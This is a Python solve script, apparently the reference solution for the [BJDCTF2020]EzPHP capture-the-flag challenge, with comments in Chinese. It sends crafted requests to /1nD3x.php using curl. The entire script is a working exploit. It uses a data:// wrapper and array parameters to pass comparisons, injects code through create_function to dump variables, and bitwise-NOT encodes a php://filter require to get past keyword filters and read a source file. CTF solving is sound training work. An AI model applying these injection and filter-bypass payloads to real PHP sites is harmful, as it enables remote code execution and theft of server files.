#!/usr/bin/env python3
"""
[BJDCTF2020]EzPHP 参考解题脚本
自动生成 URL 编码后的完整 payload 并执行 curl 请求。

用法: python3 reference_solve.py http://target:port
"""

import sys
import urllib.parse
import subprocess


def url_encode_params(params: dict[str, str]) -> str:
    """
    对所有参数名和值进行 URL 编码。
    Layer 1 的正则匹配原始 QUERY_STRING，但 $_GET 会自动解码，
    所以 URL 编码后可以绕过关键字过滤。
    """
    parts = []
    for key, val in params.items():
        encoded_key = urllib.parse.quote(key, safe="")
        encoded_val = urllib.parse.quote(val, safe="")
        parts.append(f"{encoded_key}={encoded_val}")
    return "&".join(parts)


def bitwise_not_urlencode(s: str) -> str:
    """
    对字符串每个字符取反(~)，然后 URL 编码结果。
    PHP 中 ~(binary) 会还原原字符串，绕过关键字过滤。
    """
    result = []
    for ch in s:
        # Python 的 ~ 对整数操作: ~x = -(x+1)，等价于 255 - x (for bytes)
        inverted = 255 - ord(ch)
        result.append(f"%{inverted:02x}")
    return "".join(result)


def step1_get_defined_vars(base_url: str) -> str:
    """
    Payload 1: create_function 注入 + get_defined_vars()
    返回所有变量，找到假 flag 和真 flag 文件名 rea1fl4g.php
    """
    params = {
        "file": "data://text/plain,debu_debu_aqua",
        "debu": "aqua_is_cute",
        "shana[]": "1",
        "passwd[]": "2",
        "flag[code]": "create_function",
        "flag[arg]": "}var_dump(get_defined_vars());//",
    }
    query = url_encode_params(params)
    url = f"{base_url}/1nD3x.php?{query}"
    print(f"[*] Step 1: get_defined_vars")
    print(f"[*] URL: {url}")
    print()
    result = subprocess.run(
        ["curl", "-s", url], capture_output=True, text=True, timeout=15
    )
    return result.stdout


def step2_read_real_flag(base_url: str) -> str:
    """
    Payload 2: require + 取反编码读取 rea1fl4g.php
    对 'php://filter/read=convert.base64-encode/resource=rea1fl4g.php' 取反
    """
    target_string = (
        "php://filter/read=convert.base64-encode/resource=rea1fl4g.php"
    )
    encoded_not = bitwise_not_urlencode(target_string)

    # flag[arg] 的值: }require(~(%encoded_not));//
    arg_value = f"}}require(~({encoded_not}));//"

    params = {
        "file": "data://text/plain,debu_debu_aqua",
        "debu": "aqua_is_cute",
        "shana[]": "1",
        "passwd[]": "2",
        "flag[code]": "create_function",
        "flag[arg]": arg_value,
    }
    query = url_encode_params(params)
    url = f"{base_url}/1nD3x.php?{query}"
    print(f"[*] Step 2: read rea1fl4g.php via php://filter + require + ~()")
    print(f"[*] URL: {url}")
    print()
    result = subprocess.run(
        ["curl", "-s", url], capture_output=True, text=True, timeout=15
    )
    return result.stdout


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} http://target:port")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    # Step 0: 确认 /1nD3x.php 可访问
    print(f"[*] Step 0: 确认 /1nD3x.php 可访问")
    result = subprocess.run(
        ["curl", "-s", f"{base_url}/1nD3x.php"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    if "1nD3x" in result.stdout or "highlight" in result.stdout or "<?php" in result.stdout:
        print("[+] /1nD3x.php 可访问，源码已返回")
    else:
        print("[-] /1nD3x.php 未返回预期内容，请检查")
        print(result.stdout[:500])
    print()

    # Step 1: get_defined_vars
    output1 = step1_get_defined_vars(base_url)
    print("=== Step 1 Response ===")
    print(output1)
    print()

    # Step 2: read real flag
    output2 = step2_read_real_flag(base_url)
    print("=== Step 2 Response ===")
    print(output2)
    print()

    # 尝试从 Step 2 响应中提取 base64 编码的源码并解码
    import re
    import base64

    # 找 base64 字符串（较长的）
    b64_matches = re.findall(r"[A-Za-z0-9+/=]{20,}", output2)
    for match in b64_matches:
        try:
            decoded = base64.b64decode(match).decode("utf-8", errors="replace")
            if "flag" in decoded.lower() or "<?php" in decoded or "rea1fl4g" in decoded:
                print(f"[+] 找到 Base64 编码的源码！")
                print(f"Base64: {match}")
                print(f"Decoded:\n{decoded}")
        except Exception:
            pass


if __name__ == "__main__":
    main()
